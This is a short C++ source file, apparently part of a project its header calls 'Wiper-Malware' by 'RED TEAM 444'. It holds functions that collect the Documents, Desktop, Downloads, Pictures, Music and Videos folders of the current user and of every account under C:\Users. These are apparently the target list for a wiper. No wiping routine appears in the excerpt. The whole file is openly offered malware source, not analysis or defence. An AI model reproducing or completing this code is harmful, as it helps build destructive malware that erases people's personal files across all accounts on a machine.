/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <shlobj.h>  // For SHGetFolderPath
#include <filesystem>
#include <vector>
#include <iostream>

// Get system directories like Documents, Desktop, etc., for all users
std::vector<std::string> getSystemDirectories() {
    char userProfilePath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userProfilePath);  // Get the current user's profile path
    
    std::vector<std::string> directories = {
        std::string(userProfilePath) + "\\Documents",
        std::string(userProfilePath) + "\\Desktop",
        std::string(userProfilePath) + "\\Downloads",
        std::string(userProfilePath) + "\\Pictures",
        std::string(userProfilePath) + "\\Music",
        std::string(userProfilePath) + "\\Videos"
    };
    
    return directories;
}

// Optionally, add more system-wide directories for all users
void addOtherUsersDirectories(std::vector<std::string>& directories) {
    std::string basePath = "C:\\Users";
    for (const auto& entry : std::filesystem::directory_iterator(basePath)) {
        if (entry.is_directory()) {
            std::string userDir = entry.path().string();
            directories.push_back(userDir + "\\Documents");
            directories.push_back(userDir + "\\Desktop");
            directories.push_back(userDir + "\\Downloads");
            // Add other subdirectories as needed
        }
    }
}
